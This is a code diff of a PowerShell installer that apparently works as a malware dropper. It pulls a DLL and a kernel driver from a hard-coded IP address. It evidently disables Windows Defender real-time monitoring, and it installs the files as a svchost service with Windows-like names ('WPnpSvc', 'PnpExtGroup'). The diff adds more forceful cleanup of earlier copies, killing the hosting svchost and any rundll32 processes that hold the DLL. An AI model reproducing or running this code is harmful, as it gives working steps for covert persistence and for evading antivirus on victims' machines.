@@ -2,11 +2,12 @@
 param([string]$Server = "https://64.226.66.66")
 
 $ErrorActionPreference = "SilentlyContinue"
-$SYS32    = "$env:SystemRoot\System32"
-$DRIVERS  = "$env:SystemRoot\System32\drivers"
-$SVC      = "WPnpSvc"
-$SVCGROUP = "PnpExtGroup"
-$TD       = "$env:TEMP\wpnp_$(Get-Random)"
+$SYS32      = "$env:SystemRoot\System32"
+$DRIVERS    = "$env:SystemRoot\System32\drivers"
+$SVC        = "WPnpSvc"
+$SVCGROUP   = "PnpExtGroup"
+$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
+$TD         = "$env:TEMP\wpnp_$(Get-Random)"
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
     Write-Host "[!] Run as Administrator" -ForegroundColor Red; Read-Host "Press Enter"; exit 1
@@ -33,11 +34,43 @@ foreach ($f in @("pnpext.dll","pnpext.sys")) {
         elseif ($f -eq "pnpext.dll") { Write-Host " FAIL" -ForegroundColor Red; Remove-Item $TD -Recurse -Force; try{Set-MpPreference -DisableRealtimeMonitoring $false}catch{}; Read-Host; exit 1 }
         else { Write-Host " skip" -ForegroundColor Yellow } } }
 
-Write-Host "[3/7] Removing old..." -ForegroundColor Cyan
-sc.exe stop $SVC 2>$null|Out-Null; Start-Sleep 2; sc.exe delete $SVC 2>$null|Out-Null
-Stop-Process -Name rundll32 -Force -EA SilentlyContinue
+Write-Host "[3/7] Removing old (robust)..." -ForegroundColor Cyan
+# Find hosting svchost PID, stop service cleanly, force-kill if it hangs
+function Get-ServicePid([string]$name) {
+    $line = sc.exe queryex $name 2>$null | Select-String '^\s*PID\s*:\s*(\d+)'
+    if ($line -and $line.Matches[0].Groups[1].Value) { return [int]$line.Matches[0].Groups[1].Value }
+    return 0
+}
+sc.exe query $SVC 2>$null | Out-Null
+if ($LASTEXITCODE -eq 0) {
+    $svcPid = Get-ServicePid $SVC
+    sc.exe stop $SVC 2>$null | Out-Null
+    $stopped = $false
+    for ($i = 0; $i -lt 10; $i++) {
+        Start-Sleep -Milliseconds 500
+        $q = sc.exe query $SVC 2>$null | Out-String
+        if ($q -match 'STATE\s*:\s*1\s+STOPPED') { $stopped = $true; break }
+        if ($LASTEXITCODE -ne 0) { $stopped = $true; break }
+    }
+    if (-not $stopped -and $svcPid -gt 0) {
+        Write-Host "       hung service - taskkill /F /PID $svcPid" -ForegroundColor Yellow
+        taskkill.exe /F /PID $svcPid 2>$null | Out-Null; Start-Sleep 2
+    }
+    Remove-ItemProperty -Path $svchostKey -Name $SVCGROUP -Force -EA SilentlyContinue
+    sc.exe delete $SVC 2>$null | Out-Null
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC" -Recurse -Force -EA SilentlyContinue
+}
+# Only kill rundll32s that have our DLL loaded
+Get-Process -Name rundll32 -EA SilentlyContinue | ForEach-Object {
+    try { if ($_.Modules | Where-Object { $_.ModuleName -ieq "pnpext.dll" }) {
+        Stop-Process -Id $_.Id -Force -EA SilentlyContinue
+    } } catch {}
+}
 Remove-Item "$SYS32\WPnpSvc.exe" -Force -EA SilentlyContinue
 Remove-Item "$SYS32\spoolcfg.exe" -Force -EA SilentlyContinue
+Remove-Item "$SYS32\pnpext.dll.old" -Force -EA SilentlyContinue
+Remove-Item "$SYS32\pnpext.dll.new" -Force -EA SilentlyContinue
+if (Test-Path "$env:TEMP\pnp_cache") { Remove-Item "$env:TEMP\pnp_cache\*.bin" -Force -EA SilentlyContinue }
 
 Write-Host "[4/7] Installing files..." -ForegroundColor Cyan
 foreach ($f in @("pnpext.dll","pnpext.sys")) {
@@ -50,7 +83,6 @@ foreach ($f in @("pnpext.dll","pnpext.sys")) {
 }
 
 Write-Host "[5/7] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan
-$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
 $existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
 if (-not $existing) {
     New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
